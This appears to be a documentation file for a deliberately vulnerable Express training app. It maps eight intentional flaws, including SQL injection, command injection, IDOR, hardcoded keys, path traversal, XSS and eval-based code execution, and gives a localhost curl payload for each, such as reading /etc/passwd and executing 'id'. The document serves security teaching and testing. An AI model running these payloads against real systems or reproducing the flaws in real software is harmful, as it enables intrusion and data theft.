# express-app-vuln – Vulnerability locations and exploit steps

This document describes where each intentional vulnerability lives in the `express-app-vuln` project and how to reproduce the insecure behavior. **Do not deploy this app publicly.**

---

## 1. SQL Injection (CWE-89)

- **Location:** `express-app-vuln/server.js` – SQL built via string concatenation in:
  - `POST /api/auth/register`: INSERT with `username`, `password`, `email`, `role`.
  - `POST /api/auth/login`: SELECT with `username`, `password` in WHERE.
  - `GET /api/profile/:id`: SELECT with `id` in WHERE.
  - `POST /api/profile`: INSERT with `display_name`, `bio`.
  - `PUT /api/profile/:id`: UPDATE with `display_name`, `bio`, `id`.
  - `GET /api/search`: SELECT with `q` in LIKE.
- **Example (auth bypass):**
  ```bash
  curl -X POST http://localhost:5002/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\" OR \"1\"=\"1","password":"x"}'
  ```
- **Expected insecure behavior:** Authentication bypass or data leakage/modification via crafted inputs.

---

## 2. Command Injection (CWE-78)

- **Location:** `express-app-vuln/server.js`, route `POST /api/run`. User-controlled `cmd` is passed to `execSync(cmd)`.
- **Example:**
  ```bash
  curl -X POST http://localhost:5002/api/run \
    -H "Content-Type: application/json" \
    -d '{"cmd":"id && whoami"}'
  ```
- **Expected insecure behavior:** Arbitrary commands executed with the process user.

---

## 3. Broken Access Control / IDOR (CWE-639)

- **Location:** `express-app-vuln/server.js`, route `GET /api/profile/:id`. No check that the requester owns the profile or is admin.
- **Example:**
  ```bash
  curl http://localhost:5002/api/profile/1
  ```
- **Expected insecure behavior:** Any client can read any profile by ID without auth or authorization.

---

## 4. Weak auth/session handling (CWE-287 / CWE-384)

- **Location:** `express-app-vuln/server.js` – predictable `SECRET`, MD5 passwords, cookies not httpOnly; admin protected only by a single shared API key.
- **Example:** Use SQLi in login to bypass; or reuse a captured cookie.
- **Expected insecure behavior:** Session prediction/hijack or auth bypass; weak admin protection.

---

## 5. Hardcoded secret/credential (CWE-798)

- **Location:** `express-app-vuln/server.js` top-level – `SECRET`, `ADMIN_KEY` hardcoded.
- **Example:**
  ```bash
  curl -H "X-API-Key: admin_key_abcdef" http://localhost:5002/api/admin/users
  ```
- **Expected insecure behavior:** Anyone with source can impersonate admin.

---

## 6. Insecure file upload / path traversal (CWE-434 / CWE-22)

- **Upload:** `express-app-vuln/server.js`, route `POST /api/upload` – client filename used as-is; no type/size validation.
- **Path traversal:** `express-app-vuln/server.js`, route `GET /api/file?name=...` – `name` joined with `UPLOAD_DIR` without resolving or ensuring result stays under upload dir.
- **Example (path traversal):**
  ```bash
  curl "http://localhost:5002/api/file?name=../../../etc/passwd"
  ```
- **Expected insecure behavior:** Read files outside uploads; upload of malicious files or overwrite of server files.

---

## 7. XSS (CWE-79)

- **Location:** `express-app-vuln/server.js`, route `GET /api/echo?msg=...`. `msg` is concatenated into HTML with no encoding.
- **Example:**
  ```bash
  curl "http://localhost:5002/api/echo?msg=<script>alert(1)</script>"
  ```
- **Expected insecure behavior:** Reflected XSS when response is viewed in a browser.

---

## 8. Unsafe deserialization / eval-like sink (CWE-502 / CWE-94)

- **Eval:** `express-app-vuln/server.js`, route `POST /api/eval` – body field `expr` passed to `eval(expr)`.
- **Eval (config):** `express-app-vuln/server.js`, route `POST /api/config/load` – raw body passed to `eval("(" + req.body.toString() + ")")`.
- **Example (eval):**
  ```bash
  curl -X POST http://localhost:5002/api/eval \
    -H "Content-Type: application/json" \
    -d '{"expr":"require(\"child_process\").execSync(\"id\").toString()"}'
  ```
- **Expected insecure behavior:** Remote code execution.

---

**Summary:** All vulnerabilities are in `express-app-vuln/server.js`. Use only in an isolated environment. Fixes: see the project's `SAFE_VARIANT.md`.
